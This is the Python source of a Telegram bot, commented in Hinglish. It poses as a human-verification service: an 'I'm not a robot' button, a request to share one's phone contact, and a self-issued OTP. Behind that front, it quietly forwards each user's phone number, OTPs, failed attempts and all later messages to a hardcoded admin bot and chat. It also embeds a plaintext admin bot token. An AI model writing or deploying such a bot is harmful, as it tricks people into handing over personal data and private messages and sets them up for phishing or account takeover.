import logging
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
import random
from datetime import datetime, timezone, timedelta
import os

# Bot tokens
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_BOT_TOKEN = "8286169680:AAFlw5A7AuqB5nKRyx-7Hdu0XFF_r_gjHoQ"
ADMIN_CHAT_ID = "8541208450"

if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable not set!")

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

user_data = {}

async def send_to_admin(text):
    """Admin bot ko message bhejne ke liye"""
    import aiohttp
    url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": ADMIN_CHAT_ID,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=data) as response:
                return await response.json()
    except Exception as e:
        logger.error(f"Admin message send error: {e}")

def generate_otp():
    """6-digit OTP generate karta hai"""
    return random.randint(100000, 999999)

def get_ist_time():
    """IST time format mein return karta hai"""
    ist = timezone(timedelta(hours=5, minutes=30))
    return datetime.now(ist).strftime("%d-%m-%Y %I:%M:%S %p")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1: /start command handler"""
    user = update.effective_user
    user_id = user.id
    
    user_data[user_id] = {
        "verified": False,
        "phone": None,
        "otp": None,
        "username": user.first_name or "User"
    }
    
    keyboard = [[InlineKeyboardButton("🤖 I'm not a robot", callback_data="verify_start")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎉 *Welcome to the Bot!*\n\n"
        "✅ Please verify that you're human by clicking below:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def verify_button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 2: 'I'm not a robot' button click handler"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    contact_button = KeyboardButton("📞 Share Contact", request_contact=True)
    keyboard = [[contact_button]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
    
    await query.edit_message_text(
        "✅ Verification started!\n\n"
        "📱 Please share your contact to proceed:"
    )
    
    await context.bot.send_message(
        chat_id=user_id,
        text="👇 Click the button below to share your contact:",
        reply_markup=reply_markup
    )

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 4-5: Contact receive aur OTP generate"""
    user = update.effective_user
    user_id = user.id
    contact = update.message.contact
    phone = contact.phone_number
    
    otp = generate_otp()
    
    if user_id not in user_data:
        user_data[user_id] = {}
    
    user_data[user_id]["phone"] = phone
    user_data[user_id]["otp"] = otp
    user_data[user_id]["verified"] = False
    
    admin_message = (
        f"🔔 *New User Verification Started*\n\n"
        f"👤 User: {user.first_name or 'Unknown'}\n"
        f"🆔 User ID: `{user_id}`\n"
        f"📱 Phone: `{phone}`\n"
        f"🔐 OTP: `{otp}`\n"
        f"⏰ Time: {get_ist_time()}"
    )
    await send_to_admin(admin_message)
    
    await update.message.reply_text(
        f"✅ *Contact received!*\n\n"
        f"🔐 Your OTP is: `{otp}`\n\n"
        f"📝 Please enter this OTP to complete verification.",
        parse_mode="Markdown"
    )

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 6-8: OTP verification aur normal messages"""
    user = update.effective_user
    user_id = user.id
    message_text = update.message.text
    
    if user_id not in user_data:
        await update.message.reply_text(
            "⚠️ Please start with /start command first!"
        )
        return
    
    user_info = user_data[user_id]
    
    if not user_info.get("verified") and user_info.get("otp"):
        if message_text == str(user_info["otp"]):
            user_data[user_id]["verified"] = True
            user_data[user_id]["otp"] = None
            
            await update.message.reply_text(
                "🎉 *You are verified!*\n\n"
                "✅ Verification successful!\n"
                "You can now use the bot normally.",
                parse_mode="Markdown"
            )
            
            admin_message = (
                f"✅ *User Verified Successfully*\n\n"
                f"👤 User: {user_info['username']}\n"
                f"🆔 ID: `{user_id}`\n"
                f"📱 Phone: `{user_info['phone']}`\n"
                f"⏰ Time: {get_ist_time()}"
            )
            await send_to_admin(admin_message)
        else:
            await update.message.reply_text(
                "❌ *Invalid OTP!*\n\n"
                "Please enter the correct OTP or restart with /start",
                parse_mode="Markdown"
            )
            
            admin_message = (
                f"⚠️ *Wrong OTP Attempt*\n\n"
                f"🆔 User ID: `{user_id}`\n"
                f"❌ Entered: `{message_text}`\n"
                f"✅ Correct: `{user_info['otp']}`\n"
                f"⏰ Time: {get_ist_time()}"
            )
            await send_to_admin(admin_message)
    elif user_info.get("verified"):
        await update.message.reply_text(
            "⏳ *Please wait...*",
            parse_mode="Markdown"
        )
        
        admin_message = (
            f"💬 *User Message Received*\n\n"
            f"👤 User: {user_info['username']}\n"
            f"🆔 ID: `{user_id}`\n"
            f"📱 Phone: `{user_info['phone']}`\n"
            f"💭 Message: `{message_text}`\n"
            f"⏰ Time: {get_ist_time()}"
        )
        await send_to_admin(admin_message)
    else:
        await update.message.reply_text(
            "⚠️ Please complete verification first!\n\nUse /start to begin."
        )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Error logging"""
    logger.error(f"Update {update} caused error {context.error}")

def main():
    """Bot ko start karta hai"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(verify_button_handler, pattern="verify_start"))
    application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    
    application.add_error_handler(error_handler)
    
    logger.info("🤖 Bot is running...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
